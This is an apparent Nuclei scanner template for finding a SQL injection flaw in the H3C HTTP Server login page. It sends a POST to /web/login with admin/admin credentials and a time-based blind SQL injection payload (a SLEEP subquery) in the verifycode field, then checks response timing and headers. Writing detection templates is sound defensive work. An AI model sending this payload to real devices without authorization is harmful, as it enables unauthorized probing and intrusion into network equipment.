id: h3c-http-server-login-sqli
info:
  name: H3C HTTP Server Login SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /web/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP({{t1}})))dfpe) AND 'dYCM'='&language=0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "H3C httpd"
      - type: word
        part: header
        words:
          - "application/xml"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
